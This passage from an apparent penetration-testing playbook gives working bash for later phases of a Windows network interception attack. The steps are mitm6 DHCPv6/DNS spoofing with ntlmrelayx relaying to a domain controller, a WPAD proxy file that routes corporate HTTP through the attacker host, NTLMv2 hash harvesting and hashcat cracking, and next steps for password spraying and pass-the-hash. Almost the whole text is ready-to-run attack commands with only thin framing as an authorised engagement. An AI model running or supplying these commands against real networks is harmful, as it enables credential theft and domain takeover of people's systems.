echo "ntlmrelayx (IPv6) PID: $RELAY6_PID"
echo ""

# Start mitm6 (DHCPv6 server + DNS6 spoof)
echo "--- Starting mitm6 DHCPv6 + DNS spoofing ---"
mitm6 -i "$IFACE" -d "$DOMAIN" \
    --ignore-nofqdn 2>/dev/null | \
    tee $ENG/loot/pcaps/mitm6.log | \
    grep -E "Sent|DNS|proxy|client" &

MITM6_PID=$!
echo "mitm6 PID: $MITM6_PID"
echo ""
echo "What happens next:"
echo "  1. Windows hosts request DHCPv6 → mitm6 assigns Kali as IPv6 DNS"
echo "  2. Host looks up WPAD via IPv6 DNS → mitm6 returns Kali IP"
echo "  3. Host authenticates to Kali's fake WPAD server (NTLM)"
echo "  4. ntlmrelayx relays auth to DC LDAPS → creates machine account or delegates"
echo "  5. Machine account can impersonate ANY domain user → DCSync"
echo ""
echo "Monitor: tail -f $ENG/loot/hashes/ipv6_ntlmrelayx.txt"
```

---

## Phase 9 — WPAD Proxy Injection

Inject WPAD to proxy all corporate HTTP traffic through Kali:

```bash
IFACE=<interface>
KALI_IP=<kali_ip>
ENG=/home/kali/current

echo "=== [Phase 9] WPAD Proxy Injection ==="
echo ""

# Responder handles WPAD PAC file serving automatically
# WPAD PAC file served at http://wpad/wpad.dat
cat > /tmp/wpad.dat << EOF
function FindProxyForURL(url, host) {
    if (dnsDomainIs(host, "localhost")) return "DIRECT";
    return "PROXY $KALI_IP:8080; DIRECT";
}
EOF

# Serve WPAD file
mkdir -p /var/www/html/
cp /tmp/wpad.dat /var/www/html/wpad.dat
systemctl start apache2 2>/dev/null || python3 -m http.server 80 -d /var/www/html/ &

# Configure mitmproxy to capture and log all proxied traffic
which mitmproxy 2>/dev/null && {
    echo "Starting mitmproxy on port 8080..."
    mitmproxy -p 8080 \
        --save-stream-file $ENG/loot/pcaps/mitmproxy.pcap \
        --set stream_large_bodies=1m \
        2>/dev/null &
    echo "mitmproxy UI → http://$KALI_IP:8081"
} || echo "mitmproxy not installed — using tcpdump for capture"

echo ""
echo "WPAD file served at: http://$KALI_IP/wpad.dat"
echo "All Windows machines auto-discovering WPAD will proxy HTTP through $KALI_IP:8080"
echo ""
echo "Credentials captured by Responder WPAD:"
echo "  grep -iE 'user|pass|auth' /usr/share/responder/logs/*.txt"
```

---

## Phase 10 — Harvest Results

Collect and organize everything captured:

```bash
ENG=/home/kali/current

echo ""
echo "=== MITM Results ==="
echo ""

echo "--- NTLMv2 hashes captured (Responder) ---"
find /usr/share/responder/logs/ -name "*.txt" -newer /tmp -exec grep -h "NTLMv2\|::" {} \; 2>/dev/null | \
    tee $ENG/loot/hashes/all_ntlm_hashes.txt | head -20
HASH_COUNT=$(wc -l < $ENG/loot/hashes/all_ntlm_hashes.txt 2>/dev/null || echo 0)
echo "Total hashes: $HASH_COUNT"

echo ""
echo "--- Cracked hashes ---"
[ "$HASH_COUNT" -gt "0" ] && {
    echo "Cracking NTLMv2 hashes with hashcat..."
    hashcat -m 5600 $ENG/loot/hashes/all_ntlm_hashes.txt \
        /usr/share/wordlists/rockyou.txt \
        -r /usr/share/hashcat/rules/best64.rule \
        --potfile-path $ENG/loot/hashes/hashcat.pot \
        -o $ENG/loot/hashes/cracked.txt \
        --status --status-timer=30 2>/dev/null | tail -10
    echo "Cracked passwords → $ENG/loot/hashes/cracked.txt"
    cat $ENG/loot/hashes/cracked.txt 2>/dev/null | head -10
}

echo ""
echo "--- Plain-text credentials sniffed ---"
cat $ENG/loot/credentials/sniffed_creds.txt 2>/dev/null | \
    grep -iE "user|pass|login" | sort -u | head -20

echo ""
echo "--- Relayed credentials (secretsdump results) ---"
cat $ENG/loot/hashes/ntlmrelayx_output.txt 2>/dev/null | \
    grep -E "Administrator|SAM|NTLM" | head -20

echo ""
echo "=== Next Steps ==="
echo "  → Spray cracked credentials: netexec smb <subnet> -u <user> -p '<pass>'"
echo "  → Use NTLM hashes for Pass-the-Hash: netexec smb <host> -u admin -H <ntlm_hash>"
echo "  → Escalate to domain: /pt-ad <domain> <dc-ip> <cracked-creds>"
echo "  → Dump full secrets: ntlmrelayx.py --secretsdump on more hosts"

# Save to engagement notes
cat >> $ENG/notes/engagement.md << EOF

---
## MITM Attack Results
**Date**: $(date)
**Interface**: $IFACE
**Hashes captured**: $HASH_COUNT
**Cracked**: $(wc -l < $ENG/loot/hashes/cracked.txt 2>/dev/null || echo 0)
**PCAP**: $ENG/loot/pcaps/
EOF
```

---

## Execution Rules

- **IP forwarding MUST be on** before any ARP spoofing — without it you create a DoS
- **Run Responder FIRST** (passive) — it works without MITM position and captures hashes from the whole network
- **Relay before crack** — NTLM relay (Phase 7) gives instant access without GPU time; cracking is fallback
- **IPv6 works when LLMNR is blocked** — Phase 8 bypasses "LLMNR disabled" hardening
- **STOP after engagement** — kill bettercap and arpspoof, restore ARP cache: `arpspoof -i $IFACE -t $TARGET $GATEWAY` (flush) then kill
- **Evidence** — full PCAPs are saved to `$ENG/loot/pcaps/` — include in report
